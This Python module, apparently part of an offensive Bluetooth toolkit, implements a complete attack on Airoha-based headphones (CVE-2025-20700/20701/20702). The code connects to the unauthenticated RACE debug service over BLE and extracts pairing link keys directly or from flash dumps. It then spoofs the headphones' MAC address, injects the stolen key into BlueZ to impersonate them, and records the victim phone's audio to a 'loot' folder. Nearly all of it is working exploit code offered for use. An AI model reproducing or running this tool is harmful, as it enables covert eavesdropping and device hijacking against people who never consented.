"""RACE Attack — Airoha BT headphone jacking (CVE-2025-20700/20701/20702).

Exploits unauthenticated RACE debug protocol in Airoha BT SoCs to:
  1. Connect via BLE without pairing
  2. Extract Bluetooth link keys from flash
  3. Impersonate headphones to victim's phone
  4. Capture A2DP audio / access HFP microphone

Affected: Sony WH/WF series, Bose QC, JBL, Marshall, Jabra, Xiaomi, etc.

Requirements:
  - bleak (BLE GATT client)
  - BlueZ 5.x with bluetoothd
  - bdaddr or btmgmt (for MAC spoofing)
  - PulseAudio/PipeWire (for audio capture)
  - Root privileges
"""

import asyncio
import os
import re
import struct
import subprocess
import threading
import time
from enum import IntEnum
from pathlib import Path

import urwid

from ...app_state import AppState
from ...loot_manager import LootManager
from ...privacy import is_private, mask_mac
from ..widgets.log_viewer import LogViewer
from ..widgets.list_picker import ListPickerDialog

# ---------------------------------------------------------------------------
# RACE Protocol Constants
# ---------------------------------------------------------------------------

# Airoha native GATT
AIROHA_SVC = "5052494d-2dab-0341-6972-6f6861424c45"
AIROHA_TX  = "43484152-2dab-3241-6972-6f6861424c45"
AIROHA_RX  = "43484152-2dab-3141-6972-6f6861424c45"

# Sony GATT
SONY_SVC = "dc405470-a351-4a59-97d8-2e2e3b207fbb"
SONY_TX  = "bfd869fa-a3f2-4c2f-bcff-3eb1ec80cead"
SONY_RX  = "2a6b6575-faf6-418c-923f-ccd63a56d955"

# TRSPX (Airoha transparent serial)
TRSPX_SVC = "49535343-fe7d-4ae5-8fa9-9fafd205e455"
TRSPX_TX  = "49535343-8841-43f4-a8d4-ecbe34729bb3"
TRSPX_RX  = "49535343-1e4d-4bd9-ba61-23c647249616"

# All known RACE service UUIDs
RACE_SVCS = {
    AIROHA_SVC: ("Airoha", AIROHA_TX, AIROHA_RX),
    SONY_SVC:   ("Sony",   SONY_TX,   SONY_RX),
    TRSPX_SVC:  ("TRSPX",  TRSPX_TX,  TRSPX_RX),
}

RACE_HEAD = 0x05


class RaceType(IntEnum):
    CMD        = 0x5A
    RESPONSE   = 0x5B
    CMD_NO_RSP = 0x5C
    INDICATION = 0x5D


class RaceId(IntEnum):
    READ_SDK_VERSION  = 0x0301
    READ_FLASH_PAGE   = 0x0403
    GET_LINK_KEY      = 0x0CC0
    GET_BD_ADDRESS    = 0x0CD5
    READ_ADDRESS      = 0x1680
    GET_BUILD_VERSION = 0x1E08


# ---------------------------------------------------------------------------
# RACE Protocol Client (async, uses bleak)
# ---------------------------------------------------------------------------

class RACEClient:
    """RACE protocol over BLE GATT (bleak)."""

    def __init__(self):
        self._client = None
        self._tx_uuid = None
        self._rx_uuid = None
        self._vendor = ""
        self._response = None
        self._resp_event = asyncio.Event()
        self._rx_buf = bytearray()
        self._expected = 0

    @property
    def connected(self) -> bool:
        return self._client is not None and self._client.is_connected

    @property
    def vendor(self) -> str:
        return self._vendor

    def _on_notify(self, _sender, data: bytearray):
        self._rx_buf.extend(data)
        if len(self._rx_buf) >= 6 and self._expected == 0:
            _h, _t, length, _cmd = struct.unpack_from("<BBHH", self._rx_buf)
            self._expected = length + 4  # 4 = head + type + length(2)
        if self._expected > 0 and len(self._rx_buf) >= self._expected:
            self._response = bytes(self._rx_buf[:self._expected])
            self._rx_buf = self._rx_buf[self._expected:]
            self._expected = 0
            self._resp_event.set()

    async def connect(self, address: str):
        from bleak import BleakClient
        self._client = BleakClient(address)
        await self._client.connect()
        # Try to request larger MTU (best-effort)
        if hasattr(self._client, '_backend') and hasattr(self._client._backend, '_mtu_size'):
            pass  # bleak handles MTU negotiation automatically

        # Find RACE service
        for svc in self._client.services:
            uid = svc.uuid.lower()
            if uid in RACE_SVCS:
                self._vendor, self._tx_uuid, self._rx_uuid = RACE_SVCS[uid]
                break

        if not self._tx_uuid:
            await self._client.disconnect()
            self._client = None
            raise RuntimeError("No RACE service found")

        await self._client.start_notify(self._rx_uuid, self._on_notify)

    async def disconnect(self):
        if self._client and self._client.is_connected:
            try:
                await self._client.disconnect()
            except Exception:
                pass
        self._client = None

    async def send_cmd(self, cmd_id: int, payload: bytes = b"",
                       timeout: float = 5.0) -> bytes:
        length = len(payload) + 2
        header = struct.pack("<BBHH", RACE_HEAD, RaceType.CMD, length, cmd_id)
        packet = header + payload

        self._response = None
        self._resp_event.clear()
        self._rx_buf.clear()
        self._expected = 0

        await self._client.write_gatt_char(self._tx_uuid, packet, response=True)

        try:
            await asyncio.wait_for(self._resp_event.wait(), timeout)
        except asyncio.TimeoutError:
            raise TimeoutError(f"No response for 0x{cmd_id:04X}")

        return self._response

    # -- High-level commands --

    async def get_build_version(self) -> str:
        resp = await self.send_cmd(RaceId.GET_BUILD_VERSION)
        if len(resp) > 7:
            return resp[7:].decode("ascii", errors="replace").strip("\x00")
        return "unknown"

    async def get_bd_address(self) -> str:
        resp = await self.send_cmd(RaceId.GET_BD_ADDRESS)
        if len(resp) < 14:
            raise ValueError(f"Short BD addr response ({len(resp)}B)")
        bd = resp[8:14]
        return ":".join(f"{b:02X}" for b in reversed(bd))

    async def get_link_keys(self) -> list[tuple[str, bytes]]:
        resp = await self.send_cmd(RaceId.GET_LINK_KEY, timeout=10.0)
        if len(resp) < 9:
            raise ValueError(f"Short link key response ({len(resp)}B)")
        num = resp[7]
        results = []
        off = 9
        for _ in range(num):
            if off + 22 > len(resp):
                break
            bd = resp[off:off+6]
            key = resp[off+6:off+22]
            addr = ":".join(f"{b:02X}" for b in reversed(bd))
            results.append((addr, bytes(key)))
            off += 22
        return results

    async def read_flash_page(self, address: int) -> bytes:
        payload = struct.pack("<BBI", 0x00, 0x00, address)
        resp = await self.send_cmd(RaceId.READ_FLASH_PAGE, payload, timeout=10.0)
        if len(resp) < 14:
            raise ValueError(f"Short flash response ({len(resp)}B)")
        return resp[14:]


# ---------------------------------------------------------------------------
# BLE Scanner — find devices with RACE service
# ---------------------------------------------------------------------------

async def _ble_scan(duration: float = 8.0) -> list[dict]:
    """Scan for BLE devices. Returns [{"addr": ..., "name": ..., "rssi": ..., "race": bool}]."""
    from bleak import BleakScanner
    devices = await BleakScanner.discover(timeout=duration, return_adv=True)
    results = []
    race_uuids = set(RACE_SVCS.keys())
    for dev, adv in devices.values():
        svc_uuids = set(u.lower() for u in (adv.service_uuids or []))
        is_race = bool(svc_uuids & race_uuids)
        results.append({
            "addr": dev.address,
            "name": adv.local_name or dev.name or "",
            "rssi": adv.rssi or -999,
            "race": is_race,
        })
    # Sort: RACE-positive first, then by RSSI
    results.sort(key=lambda d: (not d["race"], -d["rssi"]))
    return results


async def _check_race_vuln(address: str) -> dict:
    """Connect to device, check for RACE service, try to extract info."""
    client = RACEClient()
    info = {"vulnerable": False, "vendor": "", "version": "",
            "bd_addr": "", "link_keys": [], "error": ""}
    try:
        await client.connect(address)
        info["vulnerable"] = True
        info["vendor"] = client.vendor

        try:
            info["version"] = await client.get_build_version()
        except Exception:
            info["version"] = "?"

        try:
            info["bd_addr"] = await client.get_bd_address()
        except Exception:
            pass

        try:
            info["link_keys"] = await client.get_link_keys()
        except Exception as e:
            info["error"] = f"Link keys: {e}"

    except RuntimeError as e:
        info["error"] = str(e)
    except Exception as e:
        info["error"] = str(e)
    finally:
        await client.disconnect()
    return info


# ---------------------------------------------------------------------------
# Impersonation helpers (Classic BT)
# ---------------------------------------------------------------------------

def _spoof_bt_address(target_mac: str, adapter: str = "hci0") -> bool:
    """Spoof Bluetooth adapter MAC to impersonate headphones."""
    # Stop bluetooth service
    os.system("systemctl stop bluetooth 2>/dev/null")
    time.sleep(1)

    # Try bdaddr first (most compatible)
    ret = os.system(f"bdaddr -i {adapter} {target_mac} 2>/dev/null")
    if ret != 0:
        # Fallback: btmgmt
        ret = os.system(f"btmgmt --index 0 public-addr {target_mac} 2>/dev/null")

    # Bring adapter back up
    os.system(f"hciconfig {adapter} up 2>/dev/null")
    time.sleep(1)

    # Restart bluetooth
    os.system("systemctl start bluetooth 2>/dev/null")
    time.sleep(2)

    # Set class to Audio (headphones)
    os.system(f"hciconfig {adapter} class 0x200418 2>/dev/null")
    # Discoverable + connectable
    os.system(f"hciconfig {adapter} piscan 2>/dev/null")

    return ret == 0


def _inject_link_key(adapter_mac: str, phone_mac: str,
                     link_key: bytes, name: str = "Headphones") -> bool:
    """Inject link key into BlueZ pairing database."""
    bt_dir = Path(f"/var/lib/bluetooth/{adapter_mac.upper()}/{phone_mac.upper()}")
    bt_dir.mkdir(parents=True, exist_ok=True)

    key_hex = link_key.hex().upper()
    info = (
        "[LinkKey]\n"
        f"Key={key_hex}\n"
        "Type=4\n"
        "PINLength=0\n"
        "\n"
        "[General]\n"
        f"Name={name}\n"
        "Trusted=true\n"
        "Blocked=false\n"
    )
    (bt_dir / "info").write_text(info)

    # Restart bluetooth to load new keys
    os.system("systemctl restart bluetooth 2>/dev/null")
    time.sleep(2)
    return True


def _get_adapter_mac(adapter: str = "hci0") -> str:
    """Get current Bluetooth adapter MAC address."""
    try:
        out = subprocess.check_output(
            ["hciconfig", adapter], text=True, stderr=subprocess.DEVNULL
        )
        m = re.search(r'BD Address:\s+([0-9A-F:]{17})', out, re.IGNORECASE)
        return m.group(1).upper() if m else ""
    except Exception:
        return ""


# ---------------------------------------------------------------------------
# Audio capture helpers
# ---------------------------------------------------------------------------

def _find_bt_audio_source() -> str | None:
    """Find Bluetooth audio source in PulseAudio/PipeWire."""
    try:
        out = subprocess.check_output(
            ["pactl", "list", "sources", "short"],
            text=True, stderr=subprocess.DEVNULL
        )
        for line in out.splitlines():
            if "bluez" in line.lower():
                return line.split()[1]
    except Exception:
        pass

    # Try PipeWire
    try:
        out = subprocess.check_output(
            ["pw-cli", "list-objects"],
            text=True, stderr=subprocess.DEVNULL
        )
        # Look for bluetooth node
        for line in out.splitlines():
            if "bluez" in line.lower() and "source" in line.lower():
                return line.strip()
    except Exception:
        pass

    return None


def _start_audio_capture(source: str, output_path: str) -> subprocess.Popen | None:
    """Start recording from BT audio source."""
    try:
        proc = subprocess.Popen(
            ["parecord", "--device", source,
             "--format=s16le", "--rate=44100", "--channels=2",
             output_path],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        return proc
    except Exception:
        return None


def _setup_a2dp_sink() -> bool:
    """Configure system as A2DP audio sink (receiver)."""
    # Install bluez-tools if needed for bt-agent
    # Set adapter as audio sink
    try:
        # Register as audio sink via bluetoothctl
        subprocess.run(
            ["bluetoothctl", "system-alias", "Headphones"],
            capture_output=True, timeout=5
        )
        # Enable agent for auto-accept
        subprocess.Popen(
            ["bluetoothctl"],
            stdin=subprocess.PIPE, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        ).communicate(input=b"agent NoInputNoOutput\ndefault-agent\n", timeout=5)
    except Exception:
        pass
    return True


# ---------------------------------------------------------------------------
# TUI Screen
# ---------------------------------------------------------------------------

class RACEAttackScreen(urwid.WidgetWrap):
    """RACE Attack — Airoha headphone jacking.

    Keys:
      [s] Scan for BLE devices (highlights RACE-vulnerable)
      [c] Check vulnerability (connect + extract info)
      [e] Extract link keys
      [h] Hijack (impersonate headphones)
      [l] Listen (capture A2DP audio)
      [x] Stop / cleanup
      [esc] Back
    """

    def __init__(self, state: AppState, app,
                 loot: LootManager | None = None) -> None:
        self.state = state
        self._app = app
        self._loot = loot

        self._running = False
        self._thread: threading.Thread | None = None
        self._loop: asyncio.AbstractEventLoop | None = None
        self._scanned: list[dict] = []
        self._target_addr = ""
        self._target_name = ""
        self._headphone_mac = ""    # Classic BT MAC of headphones
        self._link_keys: list[tuple[str, bytes]] = []
        self._hijacked = False
        self._audio_proc: subprocess.Popen | None = None
        self._audio_file = ""

        self._log = LogViewer(max_lines=200)
        self._status = urwid.Text(("dim", "  [s]Scan  [c]Check  [e]Extract  [h]Hijack  [l]Listen  [x]Stop  [esc]Back"))
        self._info = urwid.Text(("warning", "  RACE Attack — idle"))

        self._idle_view = urwid.ListBox(urwid.SimpleFocusListWalker([
            urwid.Text(("default",
                        "  RACE Attack — Airoha Headphone Jacking\n"
                        "  CVE-2025-20700/20701/20702\n\n"
                        "  Exploits unauthenticated RACE debug protocol\n"
                        "  in Airoha BT chips (Sony, JBL, Bose, Marshall...)\n\n"
                        "  Attack chain (follow in order):\n"
                        "  1. [s] Scan — find BLE devices\n"
                        "  2. [c] Pick — select device from list\n"
                        "       (auto-checks RACE vuln + extracts keys)\n"
                        "  3. [e] Extract — flash dump (if [c] got no keys)\n"
                        "  4. [h] Hijack — spoof MAC, impersonate device\n"
                        "  5. [l] Listen — capture audio stream\n\n"
                        "  Each step guides you if something is missing.\n"
                        "  [x] Stop / cleanup  [esc] Back\n")),
        ]))
        self._body = urwid.WidgetPlaceholder(self._idle_view)

        self._pile = urwid.Pile([
            ("pack", self._info),
            ("pack", urwid.Divider("─")),
            self._body,
            ("pack", urwid.Divider("─")),
            ("pack", self._status),
        ])
        super().__init__(self._pile)

    def selectable(self):
        return True

    # ------------------------------------------------------------------
    # Async helper — run coroutine in background thread
    # ------------------------------------------------------------------

    def _run_async(self, coro_fn, *args):
        """Run async function in a background thread with its own event loop."""
        def _thread():
            loop = asyncio.new_event_loop()
            self._loop = loop
            try:
                loop.run_until_complete(coro_fn(*args))
            except Exception as e:
                self._log.append(f"  Error: {e}", "error")
            finally:
                loop.close()
                self._loop = None
                self._running = False

        self._running = True
        self._thread = threading.Thread(target=_thread, daemon=True)
        self._thread.start()

    # ------------------------------------------------------------------
    # Refresh
    # ------------------------------------------------------------------

    def refresh(self) -> None:
        if self._audio_proc:
            self._info.set_text(
                ("attack_active",
                 f"  RACE — RECORDING from {self._target_name}  [x] to stop")
            )
        elif self._hijacked:
            self._info.set_text(
                ("attack_active",
                 f"  RACE — HIJACKED as {self._headphone_mac}  [l] to listen")
            )
        elif self._link_keys:
            self._info.set_text(
                ("success",
                 f"  RACE — {self._target_name}  Keys:{len(self._link_keys)}  [h] to hijack")
            )
        elif self._target_addr and not self._running:
            self._info.set_text(
                ("warning",
                 f"  RACE — {self._target_name}  [c] check / [e] extract")
            )
        elif self._running:
            self._info.set_text(("warning", "  RACE Attack — working..."))
        else:
            self._info.set_text(("warning", "  RACE Attack — idle  [s] to scan"))

    # ------------------------------------------------------------------
    # Scan
    # ------------------------------------------------------------------

    def _do_scan(self) -> None:
        self._body.original_widget = self._log
        self._log.append(">>> BLE Scan (looking for RACE services)...", "attack_active")

        async def _scan():
            try:
                devices = await _ble_scan(duration=8.0)
                self._scanned = devices
                if not devices:
                    self._log.append("  No BLE devices found", "warning")
                    return

                race_count = sum(1 for d in devices if d["race"])
                self._log.append(
                    f"  Found {len(devices)} devices ({race_count} with RACE service):",
                    "success"
                )
                for i, d in enumerate(devices[:20]):
                    tag = " [RACE!]" if d["race"] else ""
                    attr = "attack_active" if d["race"] else "default"
                    name = d["name"] or "(unknown)"
                    da = mask_mac(d['addr']) if is_private() else d['addr']
                    self._log.append(
                        f"  {i+1:2d}. {da}  {d['rssi']:4d}dBm  {name}{tag}",
                        attr
                    )
                self._log.append("  Press [1-9] quick-select or [c] to pick from list", "dim")
            except ImportError:
                self._log.append("  ERROR: 'bleak' not installed", "error")
                self._log.append("  Run: pip install bleak", "dim")
            except Exception as e:
                self._log.append(f"  Scan error: {e}", "error")

        self._run_async(_scan)

    # ------------------------------------------------------------------
    # Check vulnerability
    # ------------------------------------------------------------------

    def _do_check(self, addr: str, name: str = "") -> None:
        self._target_addr = addr
        self._target_name = name or addr
        self._body.original_widget = self._log
        da = mask_mac(addr) if is_private() else addr
        self._log.append(f">>> Checking {da} for RACE vulnerability...", "attack_active")

        async def _check():
            try:
                info = await _check_race_vuln(addr)
                if info["vulnerable"]:
                    self._log.append(f"  VULNERABLE! Vendor: {info['vendor']}", "attack_active")
                    if info["version"]:
                        self._log.append(f"  Firmware: {info['version']}", "default")
                    if info["bd_addr"]:
                        self._headphone_mac = info["bd_addr"]
                        dbd = mask_mac(info['bd_addr']) if is_private() else info['bd_addr']
                        self._log.append(f"  Classic BT MAC: {dbd}", "default")
                    if info["link_keys"]:
                        self._link_keys = info["link_keys"]
                        self._log.append(f"  Link keys found: {len(info['link_keys'])}", "success")
                        for ka, kv in info["link_keys"]:
                            dka = mask_mac(ka) if is_private() else ka
                            self._log.append(f"    {dka} → {kv.hex()}", "default")
                        self._log.append("  Press [h] to hijack, [l] to listen", "dim")
                        self.state.race_running = True
                    elif info["error"]:
                        self._log.append(f"  {info['error']}", "warning")
                        self._log.append("  Try [e] to extract keys via flash dump", "dim")
                    else:
                        self._log.append("  No link keys (device may not be paired)", "warning")
                        self._log.append("  Try [e] to dump flash for keys", "dim")
                    if self._loot:
                        self._loot.log_attack_event(
                            f"RACE: Vulnerable {addr} vendor={info['vendor']} "
                            f"bd={info['bd_addr']} keys={len(info.get('link_keys', []))}"
                        )
                else:
                    self._log.append(f"  Not vulnerable: {info['error']}", "warning")
            except ImportError:
                self._log.append("  ERROR: 'bleak' not installed", "error")
                self._log.append("  Run: pip install bleak", "dim")

        self._run_async(_check)

    # ------------------------------------------------------------------
    # Extract link keys (flash dump fallback)
    # ------------------------------------------------------------------

    def _do_extract(self) -> None:
        if not self._target_addr:
            self._log.append("  Select a device first ([s] scan)", "warning")
            return
        self._body.original_widget = self._log
        dta = mask_mac(self._target_addr) if is_private() else self._target_addr
        self._log.append(f">>> Extracting keys from {dta}...", "attack_active")
        self._log.append("  Connecting + dumping flash (may take 30-60s)...", "dim")

        async def _extract():
            client = RACEClient()
            try:
                await client.connect(self._target_addr)
                self._log.append(f"  Connected (vendor: {client.vendor})", "success")

                # Try direct link key command first
                try:
                    keys = await client.get_link_keys()
                    if keys:
                        self._link_keys = keys
                        self._log.append(f"  Direct extraction: {len(keys)} key(s)", "success")
                        for kaddr, key in keys:
                            dka = mask_mac(kaddr) if is_private() else kaddr
                            self._log.append(f"    {dka} → {key.hex()}", "default")
                except Exception as e:
                    self._log.append(f"  Direct extraction failed: {e}", "warning")
                    self._log.append("  Trying flash dump...", "dim")

                # Try BD address
                try:
                    bd = await client.get_bd_address()
                    self._headphone_mac = bd
                    dbd = mask_mac(bd) if is_private() else bd
                    self._log.append(f"  Classic BT: {dbd}", "default")
                except Exception:
                    pass

                # Flash dump to find link keys (scan connection table area)
                if not self._link_keys:
                    self._log.append("  Scanning flash for link keys...", "dim")
                    flash_base = 0x08000000
                    # Scan first 256 pages (64KB) for connection table
                    found_keys = []
                    for page in range(256):
                        if not self._running:
                            break
                        addr = flash_base + (page * 0x100)
                        try:
                            data = await client.read_flash_page(addr)
                            # Look for 6-byte BT address patterns followed by 16-byte keys
                            for off in range(0, len(data) - 22, 1):
                                # Heuristic: look for non-zero 6-byte MAC + non-zero 16-byte key
                                mac_bytes = data[off:off+6]
                                key_bytes = data[off+6:off+22]
                                if (mac_bytes != b'\x00' * 6 and
                                    mac_bytes != b'\xff' * 6 and
                                    key_bytes != b'\x00' * 16 and
                                    key_bytes != b'\xff' * 16):
                                    # Check if MAC looks valid (first byte not multicast)
                                    if mac_bytes[0] & 0x01 == 0:
                                        mac_str = ":".join(f"{b:02X}" for b in reversed(mac_bytes))
                                        # Avoid duplicates
                                        if not any(m == mac_str for m, _ in found_keys):
                                            found_keys.append((mac_str, bytes(key_bytes)))
                        except Exception:
                            continue
                        # Progress every 32 pages
                        if page % 32 == 0:
                            self._log.append(f"  Flash scan: {page}/256 pages...", "dim")

                    if found_keys:
                        self._link_keys = found_keys
                        self._log.append(f"  Found {len(found_keys)} potential key(s) in flash:", "success")
                        for faddr, key in found_keys:
                            dfa = mask_mac(faddr) if is_private() else faddr
                            self._log.append(f"    {dfa} → {key.hex()}", "default")
                    else:
                        self._log.append("  No link keys found in flash", "warning")

                if self._link_keys:
                    self.state.race_running = True
                    self._log.append("  Press [h] to hijack", "dim")
                    if self._loot:
                        self._loot.log_attack_event(
                            f"RACE: Extracted {len(self._link_keys)} keys from {self._target_addr}"
                        )

            except Exception as e:
                self._log.append(f"  Extract error: {e}", "error")
            finally:
                await client.disconnect()

        self._run_async(_extract)

    # ------------------------------------------------------------------
    # Hijack — impersonate headphones
    # ------------------------------------------------------------------

    def _do_hijack(self) -> None:
        self._body.original_widget = self._log

        # Guide user through missing steps
        if not self._target_addr:
            if self._scanned:
                self._log.append("  Select a device first: [c] to pick from list", "warning")
            else:
                self._log.append("  Step 1: [s] scan for devices first", "warning")
            return
        if not self._link_keys:
            self._log.append("  Step 2: need link keys — running check...", "warning")
            self._do_check(self._target_addr, self._target_name)
            self._log.append("  After check completes, try [h] again or [e] for flash dump", "dim")
            return

        # Show picker if multiple keys
        if len(self._link_keys) > 1:
            choices = [f"{addr}  key:{key.hex()[:16]}..." for addr, key in self._link_keys]

            def on_pick(idx):
                self._app.dismiss_overlay()
                if idx is not None:
                    self._hijack_target(idx)

            dialog = ListPickerDialog("Hijack which phone?", choices, on_pick)
            self._app.show_overlay(dialog, 60, min(len(choices) + 6, 16))
        else:
            self._hijack_target(0)

    def _hijack_target(self, key_idx: int) -> None:
        phone_mac, link_key = self._link_keys[key_idx]
        hp_mac = self._headphone_mac
        dhp = mask_mac(hp_mac) if is_private() else hp_mac
        dpm = mask_mac(phone_mac) if is_private() else phone_mac
        self._log.append(f">>> Hijacking as {dhp}...", "attack_active")
        self._log.append(f"  Target phone: {dpm}", "default")
        self._log.append(f"  Link key: {link_key.hex()}", "dim")

        def _hijack_thread():
            self._running = True
            try:
                # Step 1: Spoof MAC
                self._log.append("  [1/4] Spoofing BT MAC address...", "dim")
                if not _spoof_bt_address(hp_mac):
                    self._log.append("  MAC spoof may have failed (trying anyway)", "warning")

                # Verify
                new_mac = _get_adapter_mac()
                dnm = mask_mac(new_mac) if is_private() and new_mac else new_mac
                self._log.append(f"  Adapter MAC: {dnm}", "default")

                # Step 2: Inject link key
                self._log.append("  [2/4] Injecting link key into BlueZ...", "dim")
                adapter_mac = new_mac or hp_mac
                _inject_link_key(adapter_mac, phone_mac, link_key, self._target_name or "Headphones")
                self._log.append("  Link key injected", "success")

                # Step 3: Setup A2DP sink
                self._log.append("  [3/4] Setting up A2DP sink...", "dim")
                _setup_a2dp_sink()
                self._log.append("  A2DP sink configured", "success")

                # Step 4: Wait for phone to connect
                self._hijacked = True
                self._log.append("  [4/4] Waiting for phone to auto-connect...", "attack_active")
                self._log.append("  (Phone should reconnect within 30-60s)", "dim")
                self._log.append("  Press [l] to start listening when connected", "dim")

                if self._loot:
                    self._loot.log_attack_event(
                        f"RACE: Hijacking {hp_mac} → phone {phone_mac}"
                    )

            except Exception as e:
                self._log.append(f"  Hijack error: {e}", "error")
            finally:
                self._running = False

        self._thread = threading.Thread(target=_hijack_thread, daemon=True)
        self._thread.start()

    # ------------------------------------------------------------------
    # Listen — capture audio
    # ------------------------------------------------------------------

    def _do_listen(self) -> None:
        self._body.original_widget = self._log

        # Guide user through missing steps
        if not self._target_addr:
            if self._scanned:
                self._log.append("  Select a device first: [c] to pick from list", "warning")
            else:
                self._log.append("  Step 1: [s] scan for devices first", "warning")
            return
        if not self._link_keys:
            self._log.append("  Need link keys first — press [c] to check device", "warning")
            return
        if not self._hijacked:
            self._log.append("  Need to hijack first — press [h] to impersonate", "warning")
            return

        self._log.append(">>> Looking for BT audio source...", "attack_active")

        def _listen_thread():
            self._running = True
            try:
                # Poll for BT audio source
                source = None
                for attempt in range(30):
                    if not self._running:
                        return
                    source = _find_bt_audio_source()
                    if source:
                        break
                    if attempt % 5 == 0:
                        self._log.append(f"  Waiting for BT audio ({attempt}/30)...", "dim")
                    time.sleep(2)

                if not source:
                    self._log.append("  No BT audio source found", "error")
                    self._log.append("  Phone may not be connected yet", "warning")
                    return

                self._log.append(f"  Audio source: {source}", "success")

                # Start recording
                ts = time.strftime("%Y%m%d_%H%M%S")
                if self._loot and hasattr(self._loot, '_session'):
                    loot_dir = Path(self._loot._session)
                else:
                    loot_dir = Path.home() / "loot"
                loot_dir.mkdir(parents=True, exist_ok=True)
                self._audio_file = str(loot_dir / f"bt_audio_{ts}.wav")

                self._log.append(f"  Recording to: {self._audio_file}", "default")
                self._audio_proc = _start_audio_capture(source, self._audio_file)

                if self._audio_proc:
                    self._log.append("  RECORDING... Press [x] to stop", "attack_active")
                    if self._loot:
                        self._loot.log_attack_event(f"RACE: Recording audio → {self._audio_file}")
                else:
                    self._log.append("  Failed to start recording (parecord?)", "error")

            except Exception as e:
                self._log.append(f"  Listen error: {e}", "error")
            finally:
                self._running = False

        self._thread = threading.Thread(target=_listen_thread, daemon=True)
        self._thread.start()

    # ------------------------------------------------------------------
    # Stop
    # ------------------------------------------------------------------

    def _stop(self) -> None:
        self._running = False

        # Stop audio recording
        if self._audio_proc:
            try:
                self._audio_proc.terminate()
                self._audio_proc.wait(timeout=3)
            except Exception:
                pass
            self._audio_proc = None
            if self._audio_file:
                self._log.append(f"  Audio saved: {self._audio_file}", "success")

        # Restore bluetooth service (in case we stopped it)
        os.system("systemctl start bluetooth 2>/dev/null")

        self.state.race_running = False
        self._hijacked = False
        self._link_keys.clear()
        self._headphone_mac = ""
        self._log.append(">>> RACE stopped", "warning")

    # ------------------------------------------------------------------
    # Keypress
    # ------------------------------------------------------------------

    _PASSTHROUGH = object()

    def keypress(self, size, key):
        result = self._handle_key(key)
        if result is self._PASSTHROUGH:
            return self._pile.keypress(size, key)
        return result

    def _handle_key(self, key):
        if key == "s":
            if not self._running:
                self._do_scan()
            return None

        if key == "c":
            if self._running:
                return None
            if self._scanned:
                # Show full device picker (supports >9 devices)
                choices = []
                for d in self._scanned:
                    tag = " [RACE!]" if d["race"] else ""
                    name = d["name"] or "(unknown)"
                    da = mask_mac(d['addr']) if is_private() else d['addr']
                    choices.append(f"{da}  {d['rssi']}dBm  {name}{tag}")

                def on_pick(idx):
                    self._app.dismiss_overlay()
                    if idx is not None and idx < len(self._scanned):
                        d = self._scanned[idx]
                        self._target_addr = d["addr"]
                        self._target_name = d["name"] or d["addr"]
                        self._do_check(d["addr"], d["name"])

                dialog = ListPickerDialog("Select device to check:", choices, on_pick)
                self._app.show_overlay(dialog, 65, min(len(choices) + 6, 20))
            elif self._target_addr:
                self._do_check(self._target_addr, self._target_name)
            else:
                self._log.append("  Scan first ([s])", "warning")
            return None

        # Quick-select from scan results
        if key in "12345678" and self._scanned:
            idx = int(key) - 1
            if idx < len(self._scanned):
                d = self._scanned[idx]
                self._target_addr = d["addr"]
                self._target_name = d["name"] or d["addr"]
                da = mask_mac(d['addr']) if is_private() else d['addr']
                self._log.append(f"  Selected: {da} ({d['name'] or '?'})", "default")
                # Auto-check if not running
                if not self._running:
                    self._do_check(d["addr"], d["name"])
                return None

        if key == "e":
            if not self._running:
                self._do_extract()
            return None

        if key == "h":
            if not self._running:
                self._do_hijack()
            return None

        if key == "l":
            if not self._running:
                self._do_listen()
            return None

        if key == "x":
            self._stop()
            return None

        if key == "esc":
            self._stop()
            return key

        return self._PASSTHROUGH
